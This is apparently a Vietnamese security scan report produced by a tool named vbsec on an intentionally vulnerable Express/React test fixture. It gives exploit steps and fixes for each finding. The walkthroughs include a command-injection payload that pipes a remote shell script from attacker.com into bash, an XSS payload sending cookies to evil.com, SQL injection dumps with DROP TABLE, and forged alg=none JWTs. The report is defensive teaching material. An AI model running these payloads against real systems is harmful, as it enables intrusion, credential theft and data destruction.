> Báo cáo thật, sinh ra khi chạy `/vbs-scan-security all lang=vi` trên bộ code mẫu [`tests/fixtures/typescript`](../../tests/fixtures/typescript) (app Express + React cài lỗi sẵn). Giữ nguyên nội dung, chỉ sửa link "Đọc thêm" cho đúng đường dẫn trong repo. Mật khẩu và token trong báo cáo là giá trị giả của bộ mẫu.

# Báo cáo quét bảo mật vbsec

**Phạm vi:** Toàn bộ repo
**Số file:** 11 (8 .ts, 2 .tsx, 1 .json)
**Ngôn ngữ chính:** typescript (dùng rule chuyên sâu)
**Chế độ:** NHỎ (quét trực tiếp)
**Ngày quét:** 2026-09-27
**Ngôn ngữ báo cáo:** vi

## KẾT LUẬN: KHÔNG ĐẠT

Có lỗi NGHIÊM TRỌNG. KHÔNG được deploy đến khi sửa hết.

---

## NGHIÊM TRỌNG (chặn deploy) (6) — Tổng quan (chi tiết phía dưới)

| # | File:Dòng | Loại lỗi |
|---|---|---|
| 1 | `src/lib/config.ts:3` | HARDCODED-SECRET |
| 2 | `src/lib/config.ts:4` | HARDCODED-SECRET |
| 3 | `src/routes/search.ts:10` | SQL-INJECTION |
| 4 | `src/lib/auth.ts:6` | JWT-NONE-ALGORITHM |
| 5 | `src/routes/account.ts:9` | MASS-ASSIGNMENT |
| 6 | `src/routes/convert.ts:8` | COMMAND-INJECTION |

### 🔴 [1] NGHIÊM TRỌNG — HARDCODED-SECRET tại `src/lib/config.ts:3`

**Mô tả ngắn:** Mật khẩu database `Pr0d-Db-P@ssw0rd-2024!` viết cứng trong source code, đã commit vào Git.

**Tại sao nguy hiểm?**

Password DB nằm trong repo là chìa khoá vạn năng: ai clone repo (nhân viên cũ, freelancer, hacker lấy được backup, GitHub bot quét public) đều có thể connect thẳng vào DB production — dump user, dump đơn hàng, xoá bảng, cài trigger backdoor. Value có prefix `Pr0d-` (production) + độ dài + entropy cao → không phải placeholder, đây là secret thật.

**Hacker khai thác như thế nào?**

1. Repo public / bị leak / nhân viên cũ giữ lại clone
2. `grep -r "password" .` hoặc mở `src/lib/config.ts` là thấy ngay
3. Nếu DB mở port ra internet (port 3306/5432) → connect trực tiếp bằng `mysql -h prod-host -uroot -pPr0d-Db-P@ssw0rd-2024!`
4. Nếu DB chỉ trong VPC → dùng cùng key để đoán các secret khác trong hệ thống (pattern reuse)
5. Thời gian từ leak → truy cập DB: **dưới 5 phút**

**Code hiện tại (NGUY HIỂM)**

```typescript
// src/lib/config.ts
export const config = {
  port: 3000,
  dbPassword: "Pr0d-Db-P@ssw0rd-2024!",   // ← lộ ngay trong repo
  paymentApiToken: "pay_tok_7f3a9c2e1b8d4f6a0e5c9b2d7a1f3e8c",
};
```

**Code an toàn (sửa thành)**

```typescript
// src/lib/config.ts
export const config = {
  port: Number(process.env.PORT ?? 3000),
  dbPassword: process.env.DB_PASSWORD ?? (() => { throw new Error("DB_PASSWORD chưa set") })(),
  paymentApiToken: process.env.PAYMENT_API_TOKEN ?? (() => { throw new Error("PAYMENT_API_TOKEN chưa set") })(),
};
```

Kèm theo:

```bash
# 1. XOAY password DB NGAY (assume đã lộ) + xoay payment API token
# 2. Thêm .env vào .gitignore, KHÔNG bao giờ commit
echo ".env" >> .gitignore
# 3. Xoá 2 dòng secret khỏi git history:
git filter-repo --path src/lib/config.ts --invert-paths   # hoặc rewrite bằng BFG
# 4. Cân nhắc dùng secrets manager: Doppler, AWS Secrets Manager, Vault
```

**Đọc thêm:** [Rule HARDCODED-SECRET](../../skills/vbs-scan-security/rules/generic/01-hardcoded-secret.md)

---

### 🔴 [2] NGHIÊM TRỌNG — HARDCODED-SECRET tại `src/lib/config.ts:4`

**Mô tả ngắn:** Payment API token `pay_tok_7f3a9c2e1b8d4f6a0e5c9b2d7a1f3e8c` viết cứng — hacker gọi API thanh toán như chủ tài khoản.

**Tại sao nguy hiểm?**

Token thanh toán có 32 hex chars = key thật (không phải placeholder). Với token này, hacker có thể: tạo charge giả rút tiền từ ví merchant, gửi refund tunneling đến account của họ, đọc lịch sử giao dịch của khách hàng. Payment API mà lộ = mất tiền trực tiếp trong vài phút.

**Hacker khai thác như thế nào?**

1. GitHub secret-scanning bot (GitGuardian, TruffleHog) match regex `pay_tok_[a-f0-9]{32}` chỉ vài giây sau `git push`
2. Nếu là public repo → tự động extract + test key
3. Attacker gửi request `POST /v1/charges` với token này → charge giả, tạo webhook giả
4. Với API token generic không có scope → có thể liệt kê toàn bộ khách hàng, đọc BIN card, hoàn tiền về tài khoản attacker
5. Thời gian từ push → drain ví: **dưới 10 phút** với bot tự động

**Code hiện tại (NGUY HIỂM)**

```typescript
// src/lib/config.ts:4
paymentApiToken: "pay_tok_7f3a9c2e1b8d4f6a0e5c9b2d7a1f3e8c",
```

**Code an toàn (sửa thành)**

```typescript
paymentApiToken: process.env.PAYMENT_API_TOKEN ?? (() => {
  throw new Error("PAYMENT_API_TOKEN chưa set");
})(),
```

**Đọc thêm:** [Rule HARDCODED-SECRET](../../skills/vbs-scan-security/rules/generic/01-hardcoded-secret.md)

---

### 🔴 [3] NGHIÊM TRỌNG — SQL-INJECTION tại `src/routes/search.ts:10`

**Mô tả ngắn:** Ghép `req.query.q` từ user vào template literal SQL — hacker inject SQL trực tiếp.

**Tại sao nguy hiểm?**

Đây là lỗ hổng số 1 trong lịch sử web (OWASP A03:2021). Từ endpoint search này hacker dump toàn bộ bảng `products`, `users`, `orders`, đọc password hash, hoặc `DROP TABLE`. Sequelize `sequelize.query` với template literal `${q}` KHÔNG parameterize — chỉ là string concat nguỵ trang.

**Hacker khai thác như thế nào?**

1. Mở browser: `GET /search?q=%25%27+UNION+SELECT+id,email,password+FROM+users--`
2. Câu SQL thành: `SELECT id, name, price FROM products WHERE name LIKE '%%' UNION SELECT id, email, password FROM users--%'`
3. DB trả về: cột đầu (id), cột 2 (email — thay chỗ name), cột 3 (password — thay chỗ price) của **tất cả users**
4. Tiếp `q=%'; DROP TABLE users;--` → xoá bảng
5. Thời gian dump full DB: **5-15 phút** với sqlmap tự động

**Code hiện tại (NGUY HIỂM)**

```typescript
router.get("/", async (req, res) => {
  const q = req.query.q as string;   // input từ user — KHÔNG TIN
  const rows = await sequelize.query(
    `SELECT id, name, price FROM products WHERE name LIKE '%${q}%'`,  // ghép thẳng vào SQL
    { type: QueryTypes.SELECT }
  );
  res.json(rows);
});
```

**Code an toàn (sửa thành)**

```typescript
router.get("/", async (req, res) => {
  const q = String(req.query.q ?? "");
  const rows = await sequelize.query(
    "SELECT id, name, price FROM products WHERE name LIKE :q",
    {
      replacements: { q: `%${q}%` },   // DB tự escape, không thể inject
      type: QueryTypes.SELECT,
    }
  );
  res.json(rows);
});
```

`src/routes/products.ts` đã dùng `replacements` đúng — copy pattern đó qua đây.

**Đọc thêm:** [Rule SQL-INJECTION (TS overlay)](../../skills/vbs-scan-security/rules/languages/typescript/02-sql-injection.md) · [OWASP A03](https://owasp.org/Top10/A03_2021-Injection/)

---

### 🔴 [4] NGHIÊM TRỌNG — JWT-NONE-ALGORITHM tại `src/lib/auth.ts:6`

**Mô tả ngắn:** Middleware dùng `jwt.decode()` (KHÔNG verify chữ ký) để lấy user — attacker forge token giả tuỳ ý, chiếm mọi account.

**Tại sao nguy hiểm?**

`jwt.decode()` chỉ base64-decode payload, KHÔNG kiểm tra chữ ký. Attacker tự tạo JWT với payload `{"sub":"admin-uuid","role":"admin"}`, encode base64 3 phần, header + payload + chữ ký rỗng — middleware chấp nhận. Đây là **authentication bypass hoàn toàn**: hacker vào được mọi endpoint, dùng bất kỳ user id nào, kể cả admin. Kết hợp với MASS-ASSIGNMENT ở `account.ts` → forge token admin → đổi role user khác.

**Hacker khai thác như thế nào?**

1. Attacker biết endpoint yêu cầu `Authorization: Bearer <jwt>`
2. Tự sinh token: `header = base64('{"alg":"none"}')`, `payload = base64('{"sub":"<victim-uuid>","role":"admin"}')`, `sig = ""`
3. Gửi `Authorization: Bearer <header>.<payload>.` (chú ý dấu chấm cuối)
4. `jwt.decode` trả payload, middleware set `req.user = { sub: "<victim-uuid>", role: "admin" }` — không check gì
5. Attacker gọi bất kỳ endpoint bảo vệ nào với danh nghĩa victim
6. Thời gian exploit: **< 1 phút** (có sẵn tool jwt.io, jwt_tool.py)

**Code hiện tại (NGUY HIỂM)**

```typescript
// src/lib/auth.ts
export function requireUser(req, res, next) {
  const token = (req.headers.authorization || "").replace("Bearer ", "");
  const payload = jwt.decode(token) as { sub: string; role: string } | null;  // ← KHÔNG verify chữ ký
  if (!payload) return res.status(401).end();
  (req as any).user = payload;
  next();
}
```

**Code an toàn (sửa thành)**

```typescript
import jwt from "jsonwebtoken";
import { Request, Response, NextFunction } from "express";

const JWT_SECRET = process.env.JWT_SECRET ?? (() => {
  throw new Error("JWT_SECRET chưa set");
})();

export function requireUser(req: Request, res: Response, next: NextFunction) {
  const token = (req.headers.authorization || "").replace("Bearer ", "");
  try {
    const payload = jwt.verify(token, JWT_SECRET, {
      algorithms: ["HS256"],   // KHOÁ cứng thuật toán, chặn alg=none, chặn confusion RS256→HS256
    }) as { sub: string; role: string };
    (req as any).user = payload;
    next();
  } catch {
    return res.status(401).end();
  }
}
```

**Đọc thêm:** [Rule JWT-NONE-ALGORITHM (TS)](../../skills/vbs-scan-security/rules/languages/typescript/14-jwt-none-algorithm.md)

---

### 🔴 [5] NGHIÊM TRỌNG — MASS-ASSIGNMENT tại `src/routes/account.ts:9`

**Mô tả ngắn:** `User.update(req.body, ...)` cho phép user tự set `role="admin"` và `balance=999999999`.

**Tại sao nguy hiểm?**

Model `User` có `role` (mặc định `customer`) và `balance` (mặc định 0). Endpoint truyền THẲNG `req.body` vào `update` — Sequelize update mọi field trong body. Attacker chỉ cần gửi `PUT /account` với body `{"role":"admin","balance":999999999}` là leo quyền + tự nạp tiền. Kết hợp với JWT-NONE ở trên: hacker vô danh chiếm admin trong 1 request.

**Hacker khai thác như thế nào?**

1. Attacker có token bất kỳ (hoặc forge qua lỗi JWT ở trên)
2. `curl -X PUT https://app/account -H "Authorization: Bearer ..." -d '{"role":"admin","balance":999999999,"email":"attacker@evil.com"}'`
3. Sequelize `User.update({role:"admin", balance:999999999, email:"..."}, {where:{id:userId}})` — set 3 field mà không hỏi
4. Ngay lập tức attacker thành admin + có 999 triệu credit
5. Nếu email được dùng cho reset password → chiếm luôn account gốc
6. Thời gian: **< 30 giây**

**Code hiện tại (NGUY HIỂM)**

```typescript
router.put("/", requireUser, async (req, res) => {
  const userId = (req as any).user.sub;
  await User.update(req.body, { where: { id: userId } });   // ← body chứa role/balance đều pass
  res.json({ ok: true });
});
```

**Code an toàn (sửa thành)**

```typescript
import { z } from "zod";

const UpdateAccountSchema = z.object({
  name: z.string().min(1).max(100).optional(),
  bio: z.string().max(500).optional(),
  // KHÔNG cho phép role, balance, email
});

router.put("/", requireUser, async (req, res) => {
  const parsed = UpdateAccountSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.flatten() });

  const userId = (req as any).user.sub;
  await User.update(parsed.data, { where: { id: userId } });   // chỉ update field whitelist
  res.json({ ok: true });
});
```

Hoặc pick thủ công: `const { name, bio } = req.body; await User.update({ name, bio }, ...)`.

**Đọc thêm:** [Rule MASS-ASSIGNMENT (TS)](../../skills/vbs-scan-security/rules/languages/typescript/07-mass-assignment.md)

---

### 🔴 [6] NGHIÊM TRỌNG — COMMAND-INJECTION tại `src/routes/convert.ts:8`

**Mô tả ngắn:** `exec()` với `${file}` từ `req.body.file` — hacker chèn `;` để chạy lệnh shell tuỳ ý → RCE.

**Tại sao nguy hiểm?**

`child_process.exec` chạy qua shell (`/bin/sh -c`), nghĩa là `;`, `|`, `$()`, `` ` `` đều được shell parse. `file = "x.jpg; curl evil.com/rce.sh | sh"` sẽ chạy đúng payload đó trên server. Đây là Remote Code Execution — cấp cao nhất: attacker vào được server, đọc `.env`, lấy secret DB, cài backdoor, pivot vào mạng nội bộ.

**Hacker khai thác như thế nào?**

1. `curl -X POST https://app/convert -H "Content-Type: application/json" -d '{"file":"x.jpg; curl -s https://attacker.com/shell.sh | bash"}'`
2. Server chạy: `convert uploads/x.jpg; curl -s https://attacker.com/shell.sh | bash -resize 200x200 thumbs/x.jpg...`
3. Shell tách theo `;` → lệnh 2 tải + chạy reverse shell của attacker
4. Attacker có shell trong container Node → đọc `process.env`, `src/lib/config.ts` (có 2 secret ở trên) → toàn bộ hạ tầng
5. Thời gian từ request → shell: **< 10 giây**

**Code hiện tại (NGUY HIỂM)**

```typescript
router.post("/", (req, res) => {
  const file = req.body.file;
  exec(`convert uploads/${file} -resize 200x200 thumbs/${file}`, (err, stdout) => {
    if (err) return res.status(500).json({ error: "convert failed" });
    res.json({ ok: true, output: stdout });
  });
});
```

**Code an toàn (sửa thành)**

```typescript
import { execFile } from "child_process";
import path from "path";

const SAFE_FILE = /^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|webp)$/;

router.post("/", requireUser, (req, res) => {
  const file = String(req.body.file ?? "");
  if (!SAFE_FILE.test(file)) return res.status(400).json({ error: "invalid filename" });

  const src = path.resolve("uploads", file);
  const dst = path.resolve("thumbs", file);
  // chống path traversal (dù regex đã chặn ../)
  if (!src.startsWith(path.resolve("uploads") + path.sep)) return res.status(400).end();

  execFile(
    "convert",
    [src, "-resize", "200x200", dst],   // args dạng array — KHÔNG qua shell
    (err) => {
      if (err) return res.status(500).json({ error: "convert failed" });
      res.json({ ok: true });   // KHÔNG trả stdout (xem VERBOSE-ERROR ở dưới)
    }
  );
});
```

Điểm chính:
- `execFile` (không phải `exec`) → không qua shell, metachar vô hại
- Whitelist regex extension trước khi nhét
- `path.resolve` + check prefix → chống `../../etc/passwd`
- Thêm `requireUser` (endpoint này đang public!)

**Đọc thêm:** [Rule COMMAND-INJECTION (TS)](../../skills/vbs-scan-security/rules/languages/typescript/21-command-injection.md)

---

## CAO (cần khắc phục) (4) — Tổng quan (chi tiết phía dưới)

| # | File:Dòng | Loại lỗi |
|---|---|---|
| 7 | `src/components/Comment.tsx:9` | XSS |
| 8 | `src/app.ts:11` | CORS-MISCONFIG |
| 9 | `src/app.ts:8` | MISSING-RATE-LIMIT |
| 10 | `package.json:9` | OUTDATED-DEPENDENCY |

### 🟠 [7] CAO — XSS tại `src/components/Comment.tsx:9`

**Mô tả ngắn:** `dangerouslySetInnerHTML={{ __html: body }}` với `body` từ props chưa sanitize — chèn `<script>` chạy JS trong browser user khác.

**Tác động**

React tự escape mọi text binding, nhưng `dangerouslySetInnerHTML` là "escape hatch" render HTML thô. Nếu comment `body` đến từ input user khác (mà comment thường là public), attacker post comment `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">` — mọi user xem comment đó bị đánh cắp session/token trong localStorage. XSS lan rộng khi content ở feed công cộng: 1 comment độc = ngàn nạn nhân.

**Cách sửa**

```tsx
// THAY:
import React from "react";
export function Comment({ author, body }: Props) {
  return (
    <div className="comment">
      <strong>{author}</strong>
      <div dangerouslySetInnerHTML={{ __html: body }} />   // ← XSS
    </div>
  );
}

// BẰNG (option 1 — plain text, an toàn nhất, React auto-escape):
export function Comment({ author, body }: Props) {
  return (
    <div className="comment">
      <strong>{author}</strong>
      <p>{body}</p>
    </div>
  );
}

// HOẶC (option 2 — nếu cần HTML rich text, sanitize bằng DOMPurify):
import DOMPurify from "dompurify";
export function Comment({ author, body }: Props) {
  const clean = DOMPurify.sanitize(body, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
    ALLOWED_ATTR: ["href"],
  });
  return (
    <div className="comment">
      <strong>{author}</strong>
      <div dangerouslySetInnerHTML={{ __html: clean }} />
    </div>
  );
}
```

Nếu source content từ Markdown → dùng `marked` v4+ (auto-escape) + DOMPurify là đủ.

**Đọc thêm:** [Rule XSS (TS)](../../skills/vbs-scan-security/rules/languages/typescript/03-xss.md)

---

### 🟠 [8] CAO — CORS-MISCONFIG tại `src/app.ts:11`

**Mô tả ngắn:** `cors({ origin: true, credentials: true })` — echo lại mọi Origin + accept credentials → site độc có thể đọc response API kèm cookie/token của victim.

**Tác động**

`origin: true` bảo `cors` echo lại request Origin header → mọi domain đều pass. Kèm `credentials: true` → browser gửi cookie cross-site. App hiện dùng JWT Bearer header (browser attacker không tự attach Bearer của victim) nên không escalate auth trực tiếp, nhưng: (1) nếu về sau team thêm cookie session/refresh token, lỗ hổng thành CRITICAL ngay; (2) endpoint response leak cross-origin làm dò structure API dễ hơn cho attacker.

**Cách sửa**

```typescript
// THAY:
app.use(cors({ origin: true, credentials: true }));

// BẰNG (whitelist domain cụ thể):
const ALLOWED_ORIGINS = new Set([
  "https://app.example.com",
  "https://admin.example.com",
]);

app.use(cors({
  origin: (origin, cb) => {
    // Cho phép request server-to-server (không có Origin) hoặc origin trong whitelist
    if (!origin || ALLOWED_ORIGINS.has(origin)) return cb(null, true);
    return cb(new Error("Origin không được phép"));
  },
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Authorization", "Content-Type"],
}));
```

Nếu API thuần public (không cookie, không credentials) → `cors({ origin: "*" })` không kèm `credentials: true` là chấp nhận được.

**Đọc thêm:** [Rule CORS-MISCONFIG (TS)](../../skills/vbs-scan-security/rules/languages/typescript/15-cors-misconfig.md)

---

### 🟠 [9] CAO — MISSING-RATE-LIMIT tại `src/app.ts:8`

**Mô tả ngắn:** App KHÔNG có middleware rate-limit — mọi endpoint (đặc biệt `/convert` chạy ImageMagick) bị spam vô hạn → DoS + đốt CPU/tiền.

**Tác động**

Endpoint `/convert` gọi ImageMagick subprocess (tốn CPU + memory). Không rate limit → attacker chạy 1000 req/giây, server hết CPU, request khác timeout. `/search` chạy full-table `LIKE '%q%'` cũng dễ DoS DB. Không có endpoint LLM/email nên chưa đốt bill trực tiếp, nhưng infra bill (autoscale, egress) vẫn có thể phát nổ trong đêm.

**Cách sửa**

```typescript
// src/app.ts — thêm rate limiter global + per-endpoint chặt hơn cho endpoint đắt
import rateLimit from "express-rate-limit";

// Global: 100 req/phút/IP cho toàn app
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
}));

// Riêng /convert: 10 req/phút/IP (ImageMagick đắt)
const convertLimiter = rateLimit({ windowMs: 60 * 1000, max: 10 });
app.use("/convert", convertLimiter, convertRouter);
```

Cân nhắc key theo user (`keyGenerator: (req) => req.user?.sub ?? req.ip`) để rate-limit theo account, không chỉ IP (tránh bypass bằng rotating proxy).

**Đọc thêm:** [Rule MISSING-RATE-LIMIT](../../skills/vbs-scan-security/rules/generic/18-missing-rate-limit.md)

---

### 🟠 [10] CAO — OUTDATED-DEPENDENCY tại `package.json:9`

**Mô tả ngắn:** `lodash@4.17.20` dính CVE-2021-23337 (command injection qua template). Fix ở `4.17.21`.

**Tác động**

CVE-2021-23337 cho phép command injection trong `_.template(userInput)` — nếu app có bất cứ chỗ nào dùng `_.template` với input user → RCE. Ngay cả không dùng trực tiếp, dep transitively (thư viện khác gọi lodash) cũng có thể trigger. Update chỉ patch số cuối, không breaking.

**Cách sửa**

```jsonc
// package.json
"dependencies": {
  "lodash": "^4.17.21"   // hoặc bỏ hẳn lodash nếu chỉ dùng vài helper (Node modern có Array.at, structuredClone, ...)
}
```

```bash
npm install lodash@^4.17.21
npm audit                      # xem còn CVE nào chưa
npm audit fix
# Kiểm tra transitively: npm ls lodash
```

Thêm CI check: `npm audit --audit-level=high` fail build nếu có CVE mới.

**Đọc thêm:** [Rule OUTDATED-DEPENDENCY](../../skills/vbs-scan-security/rules/generic/20-outdated-dependency.md) · [CVE-2021-23337](https://nvd.nist.gov/vuln/detail/CVE-2021-23337)

---

## TRUNG BÌNH (1)

| File:Dòng | Loại lỗi | Mô tả |
|---|---|---|
| `src/routes/convert.ts:10` | VERBOSE-ERROR-DEBUG-MODE | `res.json({ output: stdout })` trả stdout của ImageMagick — leak thông tin path/binary lên client. Trả `{ ok: true }` là đủ. |

---

## ĐÃ ĐẠT

- ✓ IDOR — `src/routes/account.ts` dùng `req.user.sub` làm khoá update, không nhận ID từ URL/body (tuy nhiên bảo mật thực tế đang bị JWT-NONE làm rỗng — sửa JWT trước)
- ✓ SLOPSQUATTING — Tất cả 6 dependency (`express`, `cors`, `jsonwebtoken`, `lodash`, `react`, `sequelize`) đều là package thật, phổ biến, chính chủ
- ✓ BRUTE-FORCE — Không có endpoint `/login`, `/signup`, `/verify-otp` trong scope
- ✓ INSECURE-DESERIALIZATION — Không có `eval`, `new Function`, `yaml.load`, `unserialize`, `vm.runIn*`
- ✓ SSRF — Không có `fetch/axios/got/http.get` với URL từ request
- ✓ PATH-TRAVERSAL — Không có `fs.readFile`/`sendFile`/`res.download` với input user (nhưng `convert.ts` có nguy cơ traversal đi kèm command injection — đã cover trong finding #6)
- ✓ CSRF — Auth qua `Authorization: Bearer` header (không cookie session), browser không tự attach → CSRF cổ điển không áp dụng
- ✓ BROKEN-ACCESS-CONTROL — Route duy nhất bảo vệ (`/account`) có `requireUser`, không có endpoint admin lộ thiên; ownership dùng `user.sub` (chỉ update chính mình). Note: đang bị compromise qua JWT-NONE + MASS-ASSIGNMENT — sửa 2 lỗi đó là kín
- ✓ WEAK-PASSWORD-HASHING — Không có code lưu/verify password (không thấy bcrypt/md5/sha1 với password)
- ✓ UNRESTRICTED-FILE-UPLOAD — Không có `multer`/`formidable`/upload endpoint trong scope (`convert.ts` chỉ đọc file có sẵn)
- ✓ RACE-CONDITION — Không có logic tài chính/ví/inventory read-modify-write không transaction (User model có `balance` nhưng chưa có endpoint decrement)

---

## Gợi ý tăng cường (không phải lỗ hổng)

Các điểm dưới đây không khai thác được, chỉ là gợi ý phòng thủ thêm. Không tính vào kết quả.

- `package.json` — chưa có `package-lock.json`/`yarn.lock` commit. Lockfile giúp reproducible install + `npm audit` chính xác. Chạy `npm install` và commit `package-lock.json`.
- `src/app.ts` — thêm `helmet` (`app.use(helmet())`) để set các security header mặc định (X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security...).
- `src/app.ts` — chưa có handler `404` và global error handler. Thêm middleware cuối để không leak stack trace khi lỗi ngoài route.
- `src/lib/db.ts` — sequelize không có `logging: false` — mặc định log SQL ra console (nhẹ, không leak qua HTTP nhưng làm bẩn log prod).

---

## Bước tiếp theo

Sửa 6 lỗi NGHIÊM TRỌNG theo thứ tự: JWT (#4) + MASS-ASSIGNMENT (#5) trước (chặn account takeover), rồi SECRET (#1, #2), COMMAND-INJECTION (#6), SQL-INJECTION (#3). Sau đó re-scan `/vbs-scan-security all` để xác nhận.

---

🤖 Báo cáo tạo bởi [vbsec](https://github.com/tanviet12/vbsec)

📄 **Báo cáo đã lưu tại:** `vbsec-reports/scan-2026-09-27-194806.md`

> ⚠️ **Khuyến nghị:** Thư mục `vbsec-reports/` chưa có trong `.gitignore`. Để tránh commit báo cáo vào Git, thêm dòng `vbsec-reports/` vào `.gitignore`.

> Báo cáo này tham khảo — không thay thế cho audit bảo mật chuyên nghiệp.

```json
{
  "verdict": "FAIL",
  "summary": {"critical": 6, "high": 4, "medium": 1, "low": 0, "passed": 11},
  "scope": "all",
  "files_reviewed": 11,
  "primary_language": "typescript",
  "specialized_rules_used": true,
  "mode": "small",
  "date": "2026-09-27",
  "findings": [
    {"file": "src/lib/config.ts", "line": 3, "rule_id": "HARDCODED-SECRET", "severity": "CRITICAL", "issue_summary": "Production DB password 'Pr0d-Db-P@ssw0rd-2024!' hardcoded in source", "fix_summary": "Load from process.env.DB_PASSWORD, rotate the leaked secret, add .env to .gitignore"},
    {"file": "src/lib/config.ts", "line": 4, "rule_id": "HARDCODED-SECRET", "severity": "CRITICAL", "issue_summary": "Payment API token 'pay_tok_7f3a...' hardcoded in source", "fix_summary": "Load from process.env.PAYMENT_API_TOKEN, rotate immediately"},
    {"file": "src/routes/search.ts", "line": 10, "rule_id": "SQL-INJECTION", "severity": "CRITICAL", "issue_summary": "req.query.q concatenated into template literal SQL via sequelize.query", "fix_summary": "Use parameterized replacements like :q as in products.ts"},
    {"file": "src/lib/auth.ts", "line": 6, "rule_id": "JWT-NONE-ALGORITHM", "severity": "CRITICAL", "issue_summary": "jwt.decode() used for auth without verifying signature — attackers can forge any token", "fix_summary": "Use jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })"},
    {"file": "src/routes/account.ts", "line": 9, "rule_id": "MASS-ASSIGNMENT", "severity": "CRITICAL", "issue_summary": "User.update(req.body, ...) allows client to set role and balance", "fix_summary": "Validate with zod schema whitelisting only name/bio, then update parsed.data"},
    {"file": "src/routes/convert.ts", "line": 8, "rule_id": "COMMAND-INJECTION", "severity": "CRITICAL", "issue_summary": "exec() with template literal ${file} from req.body allows shell command injection (RCE)", "fix_summary": "Use execFile with array args + whitelist regex + path.resolve prefix check + requireUser"},
    {"file": "src/components/Comment.tsx", "line": 9, "rule_id": "XSS", "severity": "HIGH", "issue_summary": "dangerouslySetInnerHTML with untrusted body prop enables stored XSS", "fix_summary": "Render as text {body} or sanitize with DOMPurify.sanitize before injecting HTML"},
    {"file": "src/app.ts", "line": 11, "rule_id": "CORS-MISCONFIG", "severity": "HIGH", "issue_summary": "cors({ origin: true, credentials: true }) echoes any Origin with credentials", "fix_summary": "Whitelist allowed origins via a callback and set explicit methods/allowedHeaders"},
    {"file": "src/app.ts", "line": 8, "rule_id": "MISSING-RATE-LIMIT", "severity": "HIGH", "issue_summary": "No rate limiter — /convert (ImageMagick) and /search (LIKE) are DoS vectors", "fix_summary": "Add express-rate-limit globally and stricter per-route limit for /convert"},
    {"file": "package.json", "line": 9, "rule_id": "OUTDATED-DEPENDENCY", "severity": "HIGH", "issue_summary": "lodash 4.17.20 vulnerable to CVE-2021-23337 (command injection in template)", "fix_summary": "Upgrade to lodash ^4.17.21 and run npm audit fix"},
    {"file": "src/routes/convert.ts", "line": 10, "rule_id": "VERBOSE-ERROR-DEBUG-MODE", "severity": "MEDIUM", "issue_summary": "Response returns exec stdout — leaks ImageMagick internals to client", "fix_summary": "Return only { ok: true } and log stdout to server logs if needed"}
  ],
  "hardening_notes": [
    {"file": "package.json", "line": 1, "note": "No package-lock.json committed — add lockfile for reproducible installs and accurate npm audit"},
    {"file": "src/app.ts", "line": 8, "note": "Add helmet() middleware for default security headers"},
    {"file": "src/app.ts", "line": 16, "note": "Add 404 handler and global error handler to avoid leaking stack traces on uncaught errors"},
    {"file": "src/lib/db.ts", "line": 3, "note": "Set { logging: false } on Sequelize constructor in production to avoid noisy SQL logs"}
  ],
  "top_rules_by_count": [
    {"rule_id": "HARDCODED-SECRET", "count": 2},
    {"rule_id": "SQL-INJECTION", "count": 1},
    {"rule_id": "JWT-NONE-ALGORITHM", "count": 1},
    {"rule_id": "MASS-ASSIGNMENT", "count": 1},
    {"rule_id": "COMMAND-INJECTION", "count": 1},
    {"rule_id": "XSS", "count": 1},
    {"rule_id": "CORS-MISCONFIG", "count": 1},
    {"rule_id": "MISSING-RATE-LIMIT", "count": 1},
    {"rule_id": "OUTDATED-DEPENDENCY", "count": 1},
    {"rule_id": "VERBOSE-ERROR-DEBUG-MODE", "count": 1}
  ]
}
```
